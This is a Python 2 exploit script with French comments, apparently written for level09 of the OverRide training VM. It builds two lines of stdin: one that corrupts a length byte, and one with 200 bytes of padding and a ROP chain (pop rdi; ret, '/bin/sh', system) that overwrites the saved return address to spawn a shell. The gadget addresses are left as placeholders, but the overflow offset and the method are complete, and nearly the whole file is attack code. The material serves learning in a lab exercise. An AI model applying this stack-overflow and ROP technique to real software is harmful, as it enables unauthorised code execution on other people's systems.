#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
level09 — construction du stdin (2 lignes) pour l'exploit.
Python 2 uniquement (VM OverRide souvent sans python3).

Remplir les constantes ci-dessous avec les valeurs mesurees sur TA machine
(ROPgadget, strings, objdump, GDB). Ne pas committer de binaire : tout se fait sur la VM.

Strategie : ROP minimal x86-64 — pop rdi ; ret  ->  "/bin/sh"  ->  system
Offset jusqu'au saved RIP (depuis le debut du buffer msg) : 0xc8 (200).
"""

from struct import pack
import sys

# --- A remplacer (hex entiers, ex. 0x40123a) ---
POP_RDI_RET = 0x0  # gadget "pop rdi ; ret" (binaire ou libc)
BIN_SH = 0x0       # adresse de la chaine "/bin/sh" (binaire ou libc)
SYSTEM = 0x0       # system@plt ou adresse system dans libc

# Geometrie fixe (voir walkthrough / disassembly)
OFF_RIP = 0xC8
USERNAME_LAST_BYTE = "\xff"  # LSB de msg_len -> 0xFF (255) si le mot haut reste 0
MIN_COPY = OFF_RIP + 8 * 3  # padding + 3 adresses 64-bit


def build():
    if POP_RDI_RET == 0 or BIN_SH == 0 or SYSTEM == 0:
        sys.stderr.write(
            "payload.py: definir POP_RDI_RET, BIN_SH, SYSTEM en tete de fichier "
            "(voir commands.md / Ressources/disassembly.md).\n"
        )
        sys.exit(1)

    user = "A" * 40 + USERNAME_LAST_BYTE + "\n"
    pad = "B" * OFF_RIP
    rop = pack("<Q", POP_RDI_RET) + pack("<Q", BIN_SH) + pack("<Q", SYSTEM)
    msg = pad + rop + "\n"

    if len(msg) - 1 > 255:
        sys.stderr.write(
            "payload.py: la ligne 'msg' depasse 255 octets avant \\n ; "
            "msg_len corrompu (LSB=0xff) limite souvent la copie a 255 octets.\n"
        )
        sys.exit(1)

    if len(msg) - 1 < MIN_COPY:
        sys.stderr.write("payload.py: msg trop court pour atteindre la ROP chain.\n")
        sys.exit(1)

    sys.stdout.write(user + msg)


if __name__ == "__main__":
    build()
